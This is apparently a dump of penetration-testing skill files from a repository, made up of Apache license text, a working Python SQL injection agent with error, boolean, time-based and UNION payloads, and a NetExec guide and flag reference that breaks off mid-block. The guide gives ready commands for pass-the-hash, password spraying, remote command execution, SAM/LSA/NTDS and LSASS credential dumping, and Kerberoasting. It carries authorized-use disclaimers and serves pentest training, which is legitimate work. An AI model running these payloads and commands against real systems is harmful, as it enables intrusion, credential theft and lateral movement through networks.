      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/exploiting-sql-injection-vulnerabilities/references/api-reference.md =====
# API Reference: SQL Injection Detection Agent

## Dependencies

| Library | Version | Purpose |
|---------|---------|---------|
| requests | >=2.28 | HTTP client for injection payload delivery |

## CLI Usage

```bash
python scripts/agent.py \
  --url "https://target.example.com/products" \
  --param id --method GET \
  --output sqli_report.json
```

## Functions

### `detect_error_based(url, param, method, headers) -> dict`
Injects `'` and matches response against SQL error patterns for MySQL, PostgreSQL, MSSQL, Oracle, SQLite.

### `detect_boolean_based(url, param, method, headers) -> dict`
Compares response lengths for `AND 1=1` (true) vs `AND 1=2` (false) against a baseline.

### `detect_time_based(url, param, method, headers, delay) -> dict`
Tests `SLEEP()`, `pg_sleep()`, and `WAITFOR DELAY` payloads. Measures response time against target delay.

### `detect_union_columns(url, param, method, headers, max_cols) -> dict`
Increments `ORDER BY N` until error to determine column count for UNION injection.

### `fingerprint_database(url, param, method, headers) -> dict`
Tries `@@version` and `version()` via UNION SELECT to identify the database engine.

### `run_assessment(url, param, method) -> dict`
Runs all detection techniques and compiles findings.

## SQL Error Signatures

| Database | Pattern |
|----------|---------|
| MySQL | `SQL syntax.*MySQL`, `Warning.*mysql_` |
| PostgreSQL | `ERROR:\s+syntax error`, `PSQLException` |
| MSSQL | `SQL Server.*Driver`, `SQLServerException` |
| Oracle | `ORA-\d{5}` |
| SQLite | `SQLite\.Exception` |

## Output Schema

```json
{
  "target": "https://target.example.com/products",
  "parameter": "id",
  "injectable": true,
  "error_based": {"injectable": true, "database": "mysql"},
  "boolean_based": {"injectable": true},
  "time_based": {"injectable": false},
  "findings": ["CRITICAL: Error-based SQLi confirmed (DB: mysql)"]
}
```

===== END FILE =====


===== FILE: skills/exploiting-sql-injection-vulnerabilities/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized testing in lab/CTF environments only
"""SQL injection detection agent using requests for manual technique-based testing."""

import argparse
import json
import logging
import sys
import time
import re
from typing import Optional

try:
    import requests
except ImportError:
    sys.exit("requests is required: pip install requests")

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

SQL_ERRORS = {
    "mysql": [r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException"],
    "postgresql": [r"ERROR:\s+syntax error", r"pg_query\(\)", r"PSQLException"],
    "mssql": [r"SQL Server.*Driver", r"OLE DB.*SQL Server", r"SQLServerException"],
    "oracle": [r"ORA-\d{5}", r"Oracle.*Driver", r"quoted string not properly terminated"],
    "sqlite": [r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite"],
}


def detect_error_based(url: str, param: str, method: str = "GET",
                        headers: Optional[dict] = None) -> dict:
    """Inject a single quote to detect SQL errors in the response."""
    payload = "'"
    test_url, data = _build_request(url, param, payload, method)
    resp = _send(test_url, method, data, headers)

    db_type = None
    error_found = False
    for db, patterns in SQL_ERRORS.items():
        for pattern in patterns:
            if re.search(pattern, resp.text, re.IGNORECASE):
                db_type = db
                error_found = True
                break
        if error_found:
            break

    return {
        "technique": "error_based",
        "parameter": param,
        "injectable": error_found,
        "database": db_type,
        "status_code": resp.status_code,
    }


def detect_boolean_based(url: str, param: str, method: str = "GET",
                          headers: Optional[dict] = None) -> dict:
    """Test boolean-based blind SQLi with true/false conditions."""
    baseline_resp = _send(*_build_request(url, param, "1", method), headers)
    true_resp = _send(*_build_request(url, param, "1 AND 1=1--", method), headers)
    false_resp = _send(*_build_request(url, param, "1 AND 1=2--", method), headers)

    true_match = len(true_resp.content) == len(baseline_resp.content)
    false_diff = abs(len(false_resp.content) - len(baseline_resp.content)) > 10

    return {
        "technique": "boolean_based",
        "parameter": param,
        "injectable": true_match and false_diff,
        "baseline_length": len(baseline_resp.content),
        "true_length": len(true_resp.content),
        "false_length": len(false_resp.content),
    }


def detect_time_based(url: str, param: str, method: str = "GET",
                       headers: Optional[dict] = None, delay: int = 5) -> dict:
    """Test time-based blind SQLi with sleep functions."""
    payloads = {
        "mysql": f"1 AND SLEEP({delay})--",
        "postgresql": f"1; SELECT pg_sleep({delay})--",
        "mssql": f"1; WAITFOR DELAY '0:0:{delay}'--",
    }
    results = {}
    for db, payload in payloads.items():
        start = time.time()
        _send(*_build_request(url, param, payload, method), headers)
        elapsed = time.time() - start
        results[db] = {"elapsed": round(elapsed, 2), "delayed": elapsed >= delay - 1}

    injectable = any(r["delayed"] for r in results.values())
    detected_db = next((db for db, r in results.items() if r["delayed"]), None)

    return {
        "technique": "time_based",
        "parameter": param,
        "injectable": injectable,
        "database": detected_db,
        "delay_target": delay,
        "timing_results": results,
    }


def detect_union_columns(url: str, param: str, method: str = "GET",
                          headers: Optional[dict] = None, max_cols: int = 20) -> dict:
    """Determine the number of columns for UNION-based injection."""
    for n in range(1, max_cols + 1):
        payload = f"1 ORDER BY {n}--"
        resp = _send(*_build_request(url, param, payload, method), headers)
        if resp.status_code >= 400 or "error" in resp.text.lower():
            return {"technique": "union_column_count", "parameter": param, "columns": n - 1}

    return {"technique": "union_column_count", "parameter": param, "columns": None}


def fingerprint_database(url: str, param: str, method: str = "GET",
                          headers: Optional[dict] = None) -> dict:
    """Identify the database engine using version functions."""
    version_payloads = {
        "mysql": "1 UNION SELECT @@version,NULL--",
        "postgresql": "1 UNION SELECT version(),NULL--",
        "mssql": "1 UNION SELECT @@version,NULL--",
    }
    for db, payload in version_payloads.items():
        resp = _send(*_build_request(url, param, payload, method), headers)
        if resp.status_code == 200 and len(resp.content) > 50:
            return {"database": db, "response_preview": resp.text[:200]}

    return {"database": "unknown"}


def _build_request(url: str, param: str, value: str, method: str):
    if method.upper() == "GET":
        separator = "&" if "?" in url else "?"
        return f"{url}{separator}{param}={requests.utils.quote(value)}", None
    else:
        return url, {param: value}


def _send(url: str, method: str = "GET", data: Optional[dict] = None,
           headers: Optional[dict] = None) -> requests.Response:
    h = headers or {}
    try:
        if method.upper() == "POST":
            return requests.post(url, data=data, headers=h, timeout=15, verify=False)
        return requests.get(url, headers=h, timeout=15, verify=False)
    except requests.RequestException:
        return type("FakeResp", (), {"status_code": 0, "text": "", "content": b""})()


def run_assessment(url: str, param: str, method: str = "GET") -> dict:
    """Run complete SQL injection assessment."""
    error = detect_error_based(url, param, method)
    boolean = detect_boolean_based(url, param, method)
    timing = detect_time_based(url, param, method)
    columns = detect_union_columns(url, param, method) if error["injectable"] else {}

    injectable = error["injectable"] or boolean["injectable"] or timing["injectable"]
    findings = []
    if error["injectable"]:
        findings.append(f"CRITICAL: Error-based SQLi confirmed (DB: {error['database']})")
    if boolean["injectable"]:
        findings.append("CRITICAL: Boolean-based blind SQLi confirmed")
    if timing["injectable"]:
        findings.append(f"CRITICAL: Time-based blind SQLi confirmed (DB: {timing['database']})")

    return {
        "target": url,
        "parameter": param,
        "injectable": injectable,
        "error_based": error,
        "boolean_based": boolean,
        "time_based": timing,
        "union_columns": columns,
        "findings": findings,
    }


def main():
    parser = argparse.ArgumentParser(description="SQL Injection Detection Agent")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", required=True, help="Parameter to test")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--output", default="sqli_report.json")
    args = parser.parse_args()

    report = run_assessment(args.url, args.param, args.method)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/moving-laterally-with-netexec/SKILL.md =====
---
name: moving-laterally-with-netexec
description: Use NetExec (nxc) to validate credentials, enumerate SMB shares/users/policy, password-spray safely across lockout thresholds, execute commands, and dump SAM/LSA/NTDS credentials across SMB, WinRM, LDAP, MSSQL, SSH, and other protocol modules. Use during authorized internal penetration tests to find lateral-movement paths after obtaining credentials or hashes, or to conduct controlled password spraying and post-exploitation on in-scope hosts.
domain: cybersecurity
subdomain: penetration-testing
tags:
- netexec
- lateral-movement
- smb
- password-spraying
- credential-access
- active-directory
- winrm
- post-exploitation
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
mitre_attack:
- T1021.002
---
# Moving Laterally with NetExec

> **Authorized Use Only:** This skill is for authorized penetration testing, red-team engagements, and educational labs only. NetExec authenticates to, executes code on, and extracts credentials from remote hosts. Running it against systems you do not own or lack explicit written authorization to test is illegal under computer-misuse laws (e.g. the US CFAA, UK Computer Misuse Act). Confirm scope and rules of engagement before use.

## Overview

NetExec (`nxc`) is the actively maintained successor to CrackMapExec, a network-service swiss-army knife for assessing and exploiting Windows/Active Directory and Linux environments. It wraps Impacket and other libraries behind a unified CLI so an operator can authenticate against many hosts at once, validate harvested credentials, spray passwords, enumerate shares/users/policies, execute commands, and dump credentials — all while logging cleanly for reporting.

NetExec is protocol-oriented: every invocation starts with a protocol module. As of the 2025 releases it supports **smb, winrm, mssql, ldap, ssh, ftp, wmi, rdp, vnc, and nfs**. Command execution (`-x`/`-X`) is available on SMB, WINRM, SSH, MSSQL, WMI and (since summer 2025) RDP. A built-in module system (`-M`) adds capabilities such as LAPS retrieval, LSASS dumping via `lsassy`, BloodHound collection, and share spidering.

For lateral movement specifically, NetExec maps directly to MITRE ATT&CK **T1021.002 (Remote Services: SMB/Windows Admin Shares)**: it authenticates over SMB (port 445), reaches `ADMIN$`/`C$`, and uses named-pipe or task-scheduler execution to run code on remote machines. The `(Pwn3d!)` marker in output signals that the supplied principal has local-admin code-execution rights on a host — the green light for lateral movement.

## When to Use

- During an internal network penetration test after obtaining one or more valid credentials/hashes, to identify every host where those credentials grant admin access.
- To perform controlled password spraying against a domain while respecting lockout thresholds.
- To enumerate SMB shares, domain users, password policy, and loggedon sessions across a subnet in one sweep.
- To execute commands or dump SAM/LSA/NTDS credentials on authorized targets during post-exploitation.
- To collect BloodHound data or LAPS passwords using NetExec modules instead of separate tooling.

## Prerequisites

- A Linux operator host (Kali/Parrot/Ubuntu). Install via pipx (recommended):
  ```bash
  sudo apt install -y pipx git
  pipx ensurepath
  pipx install git+https://github.com/Pennyw0rth/NetExec
  # verify
  nxc --version
  nxc smb --help
  ```
- Docker alternative:
  ```bash
  git clone https://github.com/Pennyw0rth/NetExec
  cd NetExec
  docker build -t netexec .
  docker run --rm -it netexec smb --help
  ```
- Network reachability to target ports (445/SMB, 5985-5986/WinRM, 389-636/LDAP, 1433/MSSQL).
- Valid credentials, NT hashes, or Kerberos tickets within an authorized scope.
- A signed rules-of-engagement document and knowledge of the account-lockout policy before spraying.

## Objectives

- Validate harvested credentials across a host range and locate `(Pwn3d!)` admin access.
- Enumerate shares, users, and password policy over SMB and LDAP.
- Conduct lockout-safe password spraying with `--continue-on-success`.
- Execute commands on authorized hosts and select an appropriate `--exec-method`.
- Dump SAM, LSA, and NTDS credentials and collect them into the NetExec workspace.
- Drive AD attacks (Kerberoasting, ASREPRoast, BloodHound collection) through LDAP modules.

## MITRE ATT&CK Mapping

| Technique ID | Official Name | How NetExec Implements It |
|--------------|---------------|---------------------------|
| T1021.002 | Remote Services: SMB/Windows Admin Shares | Authenticates over SMB to `ADMIN$`/`C$` and executes code on remote hosts (`-x`, `--exec-method`) |
| T1110.003 | Brute Force: Password Spraying | One password against many accounts with `--continue-on-success` |
| T1003.002 | OS Credential Dumping: Security Account Manager | `--sam` dumps local SAM hashes |
| T1003.004 | OS Credential Dumping: LSA Secrets | `--lsa` dumps LSA secrets and cached credentials |
| T1003.006 | OS Credential Dumping: DCSync | `--ntds` via drsuapi extracts the domain database |
| T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | `ldap --kerberoasting` requests service tickets |
| T1087.002 | Account Discovery: Domain Account | `--users`, `--rid-brute` enumerate domain accounts |
| T1135 | Network Share Discovery | `--shares`, `-M spider_plus` enumerate accessible shares |

## Workflow

### 1. Validate credentials and find admin access
Sweep a subnet with a credential pair or NT hash. A trailing `(Pwn3d!)` marks hosts where the principal has admin code execution — these are your lateral-movement targets.
```bash
# Cleartext password across a /24
nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' -d corp.local

# Pass-the-hash (NT only or LM:NT)
nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
nxc smb 10.10.10.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
```

### 2. Enumerate the environment
Pull users, shares, password policy, loggedon sessions, and active sessions to plan movement.
```bash
nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --users
nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --pass-pol
nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' --shares
nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' --loggedon-users --sessions
# RID brute for accounts when listing is blocked
nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --rid-brute 10000
```

### 3. Password-spray safely
Spray one password against a user list, staying under the lockout threshold. `--continue-on-success` keeps testing every account instead of stopping at the first hit.
```bash
# Discover the lockout policy FIRST
nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --pass-pol

# Spray a single password across many users
nxc smb dc01.corp.local -u users.txt -p 'Welcome2025!' --continue-on-success

# Validate a credential set across the domain without bruteforcing
nxc ldap dc01.corp.local -u users.txt -p 'Spring2025!' --continue-on-success --no-bruteforce
```

### 4. Execute commands on authorized hosts
On `(Pwn3d!)` targets, run commands and choose a quieter execution channel when needed.
```bash
# Default execution
nxc smb 192.168.1.50 -u Administrator -H <hash> -x 'whoami /all'

# Pick an exec method: smbexec, wmiexec, atexec, mmcexec
nxc smb 192.168.1.50 -u Administrator -H <hash> --exec-method wmiexec -x 'hostname'

# PowerShell over WinRM (amsi-bypassed, base64-encoded transparently)
nxc winrm 192.168.1.50 -u Administrator -H <hash> -X '$PSVersionTable'
```

### 5. Dump credentials
Harvest local and domain credentials from authorized hosts to fuel further movement.
```bash
# Local SAM hashes and LSA secrets
nxc smb 192.168.1.50 -u Administrator -H <hash> --sam --lsa

# In-memory LSASS dump via the lsassy module
nxc smb 192.168.1.50 -u Administrator -H <hash> -M lsassy

# Domain database from a DC (DRSUAPI default, or VSS)
nxc smb dc01.corp.local -u Administrator -H <hash> --ntds
nxc smb dc01.corp.local -u Administrator -H <hash> --ntds vss
```

### 6. Drive AD attacks via LDAP and modules
Use protocol modules to pivot to ticket attacks, delegation, LAPS, and BloodHound ingestion.
```bash
# Kerberoasting and ASREPRoasting
nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' --kerberoasting kerb.out
nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' --asreproast asrep.out

# Read LAPS passwords where permitted
nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' -M laps

# Collect BloodHound data
nxc ldap dc01.corp.local -u jsmith -p 'Summer2025!' --bloodhound --collection All --dns-server 192.168.1.10

# MSSQL command/query execution
nxc mssql 192.168.1.60 -u sa -p 'Sql2025!' --local-auth -q 'SELECT name FROM sys.databases'
nxc mssql 192.168.1.60 -u sa -p 'Sql2025!' --local-auth -x 'whoami'
```

### 7. Review the workspace and report
NetExec stores results in a per-protocol SQLite workspace under `~/.nxc/`. Review captured credentials and admin relationships for the report.
```bash
nxc smb -L              # list SMB modules
ls ~/.nxc/workspaces/
nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' --shares --log spray_results.log
```

## Tools and Resources

| Tool | Purpose | Source |
|------|---------|--------|
| NetExec (`nxc`) | Multi-protocol network exploitation | https://github.com/Pennyw0rth/NetExec |
| NetExec Wiki | Official docs and per-protocol flags | https://www.netexec.wiki/ |
| Impacket | Underlying SMB/MSSQL/Kerberos libraries | https://github.com/fortra/impacket |
| lsassy | Remote LSASS extraction (NetExec module) | https://github.com/login-securite/lsassy |
| BloodHound CE | Graph analysis of collected AD data | https://github.com/SpecterOps/BloodHound |
| NetExec Cheat Sheet | Command reference | https://www.stationx.net/netexec-cheat-sheet/ |

## Validation Criteria

- [ ] NetExec installed and `nxc --version` confirmed.
- [ ] Account-lockout policy reviewed before any spraying.
- [ ] Credentials validated across the in-scope host range.
- [ ] `(Pwn3d!)` admin-access hosts enumerated and documented.
- [ ] Shares, users, and password policy collected.
- [ ] Password spraying performed under lockout thresholds with `--continue-on-success`.
- [ ] Command execution tested with an appropriate `--exec-method`.
- [ ] Credential dumping (`--sam`/`--lsa`/`--ntds`) performed only on authorized targets.
- [ ] LDAP attacks (Kerberoasting/ASREPRoast/LAPS/BloodHound) executed where in scope.
- [ ] Workspace results exported and included in the engagement report.

===== END FILE =====


===== FILE: skills/moving-laterally-with-netexec/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/moving-laterally-with-netexec/references/api-reference.md =====
# NetExec (nxc) — API / Command Reference

## General Syntax

```
nxc [runtime options] <protocol> <target> [auth] [actions] [-M module] [-o KEY=val]
```

Supported protocols: `smb winrm mssql ldap ssh ftp wmi rdp vnc nfs`.

## Authentication Flags

| Flag | Description |
|------|-------------|
| `-u USER` | Username (or file of usernames) |
| `-p PASS` | Password (or file of passwords) |
| `-H HASH` | NT hash or `LM:NT` for pass-the-hash |
| `-d DOMAIN` | Target domain |
| `--local-auth` | Authenticate against the local SAM, not the domain |
| `-k` / `--use-kcache` | Kerberos auth using ccache (`KRB5CCNAME`) |
| `--continue-on-success` | Keep testing after a valid login (spraying) |
| `--no-bruteforce` | Pair user[i] with pass[i] instead of full matrix |

## SMB Actions

| Flag | Description |
|------|-------------|
| `--shares` | List accessible shares and permissions |
| `--users` / `--groups` | Enumerate domain users / groups |
| `--pass-pol` | Dump password / lockout policy |
| `--rid-brute [N]` | Enumerate accounts by RID cycling |
| `--loggedon-users` / `--sessions` | Show logged-on users / active sessions |
| `-x CMD` / `-X PS` | Execute shell / PowerShell command |
| `--exec-method M` | `smbexec`, `wmiexec`, `atexec`, `mmcexec` |
| `--sam` / `--lsa` | Dump SAM hashes / LSA secrets |
| `--ntds [vss\|drsuapi]` | Dump the domain NTDS.dit |
| `-M MODULE` | Run a module (e.g. `lsassy`, `spider_plus`) |

## LDAP Actions

| Flag | Description |
|------|-------------|
| `--kerberoasting FILE` | Request and save Kerberoastable hashes |
| `--asreproast FILE` | Request and save AS-REP roastable hashes |
| `--bloodhound --collection All` | Collect BloodHound data |
| `--trusted-for-delegation` | Find delegation-enabled accounts |
| `-M laps` | Read LAPS passwords |

## WinRM / MSSQL Actions

| Flag | Description |
|------|-------------|
| `winrm ... -X 'PScmd'` | Execute PowerShell over WinRM (5985/5986) |
| `mssql ... -q 'SQL'` | Run a SQL query |
| `mssql ... -x 'cmd'` | Execute OS command via xp_cmdshell |

## Modules and Workspace

```bash
nxc smb -L            # list SMB modules
nxc smb -M lsassy --options   # show module options
